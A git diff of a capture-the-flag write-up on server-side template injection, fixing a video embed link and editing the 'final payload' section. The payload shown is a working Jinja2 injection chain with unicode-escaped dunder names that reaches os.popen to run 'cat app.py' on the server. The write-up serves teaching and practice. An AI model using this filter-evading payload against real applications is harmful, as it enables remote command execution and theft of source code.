@@ -167,7 +167,7 @@ Connection: close
 <iframe width="1280" height="720" src="https://www.youtube.com/embed/SN6EVIG4c-0" title="Server-Side Template Injections Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 
-<iframe width="1280" height="720" src="https://youtu.be/SN6EVIG4c-0?t=562" title="Server-Side Template Injections Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+<iframe width="1280" height="720" src="https://www.youtube.com/embed/SN6EVIG4c-0?t=562" title="Server-Side Template Injections Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 
 ## Crafting payload
@@ -235,11 +235,11 @@ we will get
 
 ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%209.png)
 
-final payload:
+final payload without `{{}}`:
 
 ```python
 
-{{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()[207]['\U0000005f\U0000005f\U00000069\U0000006e\U00000069\U00000074\U0000005f\U0000005f']['\U0000005f\U0000005f\U00000067\U0000006c\U0000006f\U00000062\U00000061\U0000006c\U00000073\U0000005f\U0000005f']['sys']['modules']['os']['\U00000070\U0000006f\U00000070\U00000065\U0000006e']('cat+app.py')['\U00000072\U00000065\U00000061\U00000064']()}}
+''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()[207]['\U0000005f\U0000005f\U00000069\U0000006e\U00000069\U00000074\U0000005f\U0000005f']['\U0000005f\U0000005f\U00000067\U0000006c\U0000006f\U00000062\U00000061\U0000006c\U00000073\U0000005f\U0000005f']['sys']['modules']['os']['\U00000070\U0000006f\U00000070\U00000065\U0000006e']('cat+app.py')['\U00000072\U00000065\U00000061\U00000064']()
 
 ```
 
